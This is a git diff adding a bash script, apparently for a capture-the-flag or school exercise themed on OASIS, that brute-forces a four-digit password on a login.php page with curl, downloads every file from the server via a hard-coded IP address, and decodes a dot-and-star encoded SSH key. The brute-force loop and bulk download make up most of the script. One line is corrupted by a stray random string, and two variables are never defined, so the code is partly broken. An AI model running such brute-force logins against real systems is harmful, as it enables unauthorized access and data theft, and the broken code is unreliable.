@@ -1,0 +1,107 @@
+#!/bin/bash
+#######################
+### QUICK CRACK BOT ###
+#######################
+IP_ADDRESS=""
+PASSWORD=""
+URL=""
+LOGIN="halliday_j"
+OUTPUT_DIR="./out/www"
+
+# Get IP adress of the server to crack
+getIP()
+{
+  IP_ADDRESS=$1
+}
+
+#######################################
+### Key 1 – Crack OASIS access code ###
+#######################################
+getKey1()
+{
+  CURRENT_PASSWORD="0"
+  FOUND="1"
+  
+  # On bruteforce le password
+  echo "Trying to connect to http://$IP_ADDRESS/login.php"
+  echo "Please wait..."
+  while [ $CURRENT_PASSWORD -le 9999 ] && [ $FOUND -eq 1 ]
+  do
+    PASSWORD=$(printf "%04s" $CURRENT_PASSWORD)
+    curlJob $LOGIN $PASSWORD
+    CURRENT_PASSWORD=$(($CURRENT_PASSWORD + 1))  
+  done
+  echo "Connected!"
+}
+# Job de curl
+curlJob()
+{
+  # Appel de l'url de connexion avec le login/mdp
+  URL=$(curl -sw %{redirect_url} -d "login=$1&password=$2" -o /dev/null -X POST "http://$IP_ADDRESS/login.php")
+  
+  # Si on a une URL de redirection c'est que l'on a réussi à s'identifier
+  if [ $URL ]
+  then
+    FOUND="0"
+  fi
+}
+# Methode de téléchargement de tous les fichiers
+downloadFile()
+{
+  echo "Creating output directy"
+  mkdir -p $OUTPUT_DIR
+  echo "Output directory created"
+  echo "Start downloading files"
+  for fileToDownload in $(curl -s http://163.5.245.214/etna/files/ | grep "href=.*" -o | cut -d= -f2 | cut -d\" -f2 | grep "^[a-zA-Z0-9]")
+  do
+    echo "Downloading $fileToDownload"
+    curl -s -o $OUTPUT_DIR/$fileToDownload $URL/$fileToDownload
+  done
+  echo "Files downloaded!"
+}
+
+# Key 2 – Reconstruct SSH key
+getKey2()
+{
+  # On recherche une clé à base de . et * dans le répertoire INPUT_DIR
+  key=$(grep -o "[\.\*]\{128,\}" $INPUT_DIR/* | cut -d: -f2)
+  echo $key
+
+  # On décode la clé
+  decodeKey $key
+}
+# Methode pour décoder la clé
+decodeKey()
+{
+  # On récupère le paramètre
+  param=$1
+
+  # On calcule la longueur de la clé
+  size=${#param}
+4j7B7HBSTE5kPmYB2OWMwiTi42gYSNoVhf2vxRw1EJ  echo "size:$size"
+
+  # On transforme la clé en binaire
+  todecode=$(echo $param | sed "s/\./0/g;s/\*/1/g")
+  echo $todecode
+
+  # On boucle sur la clé pour la décoder
+  cpt="0"
+  key=""
+  while [ $cpt -lt $size ]
+  do
+    # On récupère l'octet en cours
+    octet=${todecode:cpt:8}
+
+    # On décode la clé en transformant le binaire -> decimal -> octal -> ASCII
+    key+=$(printf $(printf "\%o" $((2#${todecode:cpt:8}))))
+   
+    # On incrémente le compteur d'un octet
+    cpt=$(($cpt + 8))
+  done
+  echo "$key"
+  echo "$key" > $OUTFILE
+}
+getIP $@
+getKey1 $IP_ADDRESS
+downloadFile
+getKey2
